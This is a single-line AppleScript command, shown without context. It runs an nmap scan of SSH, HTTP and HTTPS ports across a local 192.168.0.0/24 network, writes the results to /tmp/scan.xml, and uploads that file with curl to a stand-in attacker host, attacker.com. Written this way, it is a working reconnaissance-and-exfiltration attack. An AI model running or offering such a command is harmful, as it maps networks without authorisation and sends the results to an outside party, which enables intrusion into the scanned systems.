do shell script "nmap -sT -p 22,80,443 192.168.0.0/24 -oX /tmp/scan.xml && curl -F 'file=@/tmp/scan.xml' http://attacker.com"
